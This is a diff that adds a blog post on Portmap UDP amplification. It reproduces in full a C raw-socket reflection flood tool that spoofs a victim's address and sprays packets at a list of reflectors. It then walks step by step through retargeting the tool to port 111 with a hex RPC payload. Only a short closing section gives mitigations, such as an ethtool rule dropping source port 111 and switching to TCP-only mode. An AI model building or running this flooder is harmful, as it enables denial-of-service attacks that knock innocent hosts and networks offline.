@@ -1,0 +1,274 @@
+= Portmap amplification
+
+While this post is a bit late, man I am lazy, the timing of it reflects on the danger of it. 
+
+
+##### Portmap?
+
+Portmap is a pretty cool program showing information but I'm not here to talk about that, you can always just check them out yourself (http://linux.die.net/man/8/portmap).
+
+
+###### What's the danger of this amplification method?
+
+
+Portmap's amplification method has an amplification rate of 7-28x as stated by US-Certs (https://www.us-cert.gov/ncas/alerts/TA14-017A) but seen in the wild to have a value of 1348 bytes (19.8x). 
+
+###### How can this even be possible!?
+
+UDP amplification is a fairly simple thing! 
+
+Essentially you search for a function that is externally accessible and responds with a bigger packet than one you send, in this case that is "Portmap"!
+
+Let's start by grabbing a script off the internet to show how easy UDP amplification is shall we?
+
+http://lmgtfy.com/?q=site%3Apastebin.com+SSDP.c
+
+We then click the first one and *BAM* you've got a script that does UDP amplification but wait, this won't be ready just yet.
+	
+ 
+ 	
+
+        #include <time.h>
+        #include <pthread.h>
+        #include <unistd.h>
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <string.h>
+        #include <sys/socket.h>
+        #include <netinet/ip.h>
+        #include <netinet/udp.h>
+        #include <arpa/inet.h>
+        #define MAX_PACKET_SIZE 8192
+        #define PHI 0x9e3779b9
+        static uint32_t Q[4096], c = 362436;
+        struct list
+        {
+                struct sockaddr_in data;
+                struct list *next;
+                struct list *prev;
+        };
+        struct list *head;
+        struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
+        void init_rand(uint32_t x)
+        {
+                int i;
+                Q[0] = x;
+                Q[1] = x + PHI;
+                Q[2] = x + PHI + PHI;
+                for (i = 3; i < 4096; i++)
+                {
+                        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+                }
+        }
+        uint32_t rand_cmwc(void)
+        {
+                uint64_t t, a = 18782LL;
+                static uint32_t i = 4095;
+                uint32_t x, r = 0xfffffffe;
+                i = (i + 1) & 4095;
+                t = a * Q[i] + c;
+                c = (t >> 32);
+                x = t + c;
+                if (x < c) {
+                        x++;
+                        c++;
+                }
+                return (Q[i] = r - x);
+        }
+        /* function for header checksums */
+        unsigned short csum (unsigned short *buf, int nwords)
+        {
+                unsigned long sum;
+                for (sum = 0; nwords > 0; nwords--)
+                sum += *buf++;
+                sum = (sum >> 16) + (sum & 0xffff);
+                sum += (sum >> 16);
+                return (unsigned short)(~sum);
+        }
+        void setup_ip_header(struct iphdr *iph)
+        {
+                iph->ihl = 5;
+                iph->version = 4;
+                iph->tos = 0;
+                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 90;
+                iph->id = htonl(54321);
+                iph->frag_off = 0;
+                iph->ttl = MAXTTL;
+                iph->protocol = IPPROTO_UDP;
+                iph->check = 0;
+                iph->saddr = inet_addr("192.168.3.100");
+        }
+        void setup_udp_header(struct udphdr *udph)
+        {
+                udph->source = htons(5678);
+                udph->dest = htons(1900);
+                udph->check = 0;
+                strcpy((void *)udph + sizeof(struct udphdr), "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n");
+                udph->len=htons(sizeof(struct udphdr) + 90);
+        }
+        void *flood(void *par1)
+        {
+                struct thread_data *td = (struct thread_data *)par1;
+                char datagram[MAX_PACKET_SIZE];
+                struct iphdr *iph = (struct iphdr *)datagram;
+                struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+                struct sockaddr_in sin = td->sin;
+                struct  list *list_node = td->list_node;
+                int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+                if(s < 0){
+                        fprintf(stderr, "Could not open raw socket.\n");
+                        exit(-1);
+                }
+                init_rand(time(NULL));
+                memset(datagram, 0, MAX_PACKET_SIZE);
+                setup_ip_header(iph);
+                setup_udp_header(udph);
+                udph->source = sin.sin_port;
+                iph->saddr = sin.sin_addr.s_addr;
+                iph->daddr = list_node->data.sin_addr.s_addr;
+                iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+                int tmp = 1;
+                const int *val = &tmp;
+                if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+                        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+                        exit(-1);
+                }
+                int i=0;
+                while(1){
+                        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
+                        list_node = list_node->next;
+                        iph->daddr = list_node->data.sin_addr.s_addr;
+                        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+                        if(i==5)
+                        {
+                                usleep(0);
+                                i=0;
+                        }
+                        i++;
+                }
+        }
+        int main(int argc, char *argv[ ])
+        {
+                if(argc < 4){
+                        fprintf(stderr, "Invalid parameters!\n");
+                        fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <throttle> <time (optional)>\n", argv[0]);
+                        exit(-1);
+                }
+                int i = 0;
+                head = NULL;
+                fprintf(stdout, "Setting up Sockets...\n");
+                int max_len = 128;
+                char *buffer = (char *) malloc(max_len);
+                buffer = memset(buffer, 0x00, max_len);
+                int num_threads = atoi(argv[4]);
+                FILE *list_fd = fopen(argv[3],  "r");
+                while (fgets(buffer, max_len, list_fd) != NULL) {
+                        if ((buffer[strlen(buffer) - 1] == '\n') ||
+                                        (buffer[strlen(buffer) - 1] == '\r')) {
+                                buffer[strlen(buffer) - 1] = 0x00;
+                                if(head == NULL)
+                                {
+                                        head = (struct list *)malloc(sizeof(struct list));
+                                        bzero(&head->data, sizeof(head->data));
+                                        head->data.sin_addr.s_addr=inet_addr(buffer);
+                                        head->next = head;
+                                        head->prev = head;
+                                } else {
+                                        struct list *new_node = (struct list *)malloc(sizeof(struct list));
+                                        memset(new_node, 0x00, sizeof(struct list));
+                                        new_node->data.sin_addr.s_addr=inet_addr(buffer);
+                                        new_node->prev = head;
+                                        new_node->next = head->next;
+                                        head->next = new_node;
+                                }
+                                i++;
+                        } else {
+                                continue;
+                        }
+                }
+                struct list *current = head->next;
+                pthread_t thread[num_threads];
+                struct sockaddr_in sin;
+                sin.sin_family = AF_INET;
+                sin.sin_port = htons(atoi(argv[2]));
+                sin.sin_addr.s_addr = inet_addr(argv[1]);
+                struct thread_data td[num_threads];
+                for(i = 0;i<num_threads;i++){
+                        td[i].thread_id = i;
+                        td[i].sin= sin;
+                        td[i].list_node = current;
+                        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+                }
+                fprintf(stdout, "Starting Flood...\n");
+                if(argc > 5)
+                {
+                        sleep(atoi(argv[5]));
+                } else {
+                        while(1){
+                                sleep(1);
+                        }
+                }
+                return 0;
+        }
+
+
+
+Now that we have the script let's get working on it!
+
+First let's take a look at the IP header function -
+
+  void setup_ip_header(struct iphdr *iph)
+  {
+          iph->ihl = 5;
+          iph->version = 4;
+          iph->tos = 0;
+          iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 90;
+          iph->id = htonl(54321);
+          iph->frag_off = 0;
+          iph->ttl = MAXTTL;
+          iph->protocol = IPPROTO_UDP;
+          iph->check = 0;
+          iph->saddr = inet_addr("192.168.3.100");
+  }
+
+Now you'll see that we need to change some stuff! The size of the payload for Portmap is "40" instead of "90" so we've gotta change that -
+
+	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 40;
+    
+then let's change the port to Portmap's port (111) -
+
+  udph->dest = htons(111);
+
+and finally change the payload! but wait...who actually uses strcpy anymore if we know the payload size? Let's just change that real quick!
+
+  memcpy((void *)udph + sizeof(struct udphdr), "\x65\x72\x0A\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 40);
+
+Then finally change 
+
+	udph->len=htons(sizeof(struct udphdr) + 40);
+    
+   
+and we're set to go!
+
+Simple, right? That's exactly the problem...Amplification nowadays is so easy that anybody with half a brain could do it! so how do we stop this? Well one way is to just block source port 111! (http://dosattack.net/2015/09/13/Lets-talk-about-mitigation.html)
+as said in our other post 
+
+	ethtool --config-ntuple eth flow-type udp4 src-port 111 action -1
+
+
+Portmap also functions on both UDP and TCP so if you're running a system that has it (~5 million devices) then switch to TCP-only mode and help ease the amount of traffic by closing off more reflectors!
+
+I've personally taken the effort to email one of my favorite sites to monitor these types of amplification vectors to tell them to add it, https://www.shadowserver.org/wiki/. 
+
+image::https://i.imgur.com/WMJKGfx.png[]
+
+(We'll miss you Mailbox D: )
+
+
+
+I'll put more effort into this post as the issue arises more but as we saw by a post by Level3 (blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/)
+
+Portmap is such a little threat that it barely shows up on their graphs of UDP amplification attacks (which I'm shocked to see that DNS amplification is higher than SSDP on)
+
+image::http://blog.level3.com/wp-content/uploads/2015/08/reflection-highres-1024x531.jpg[]
+
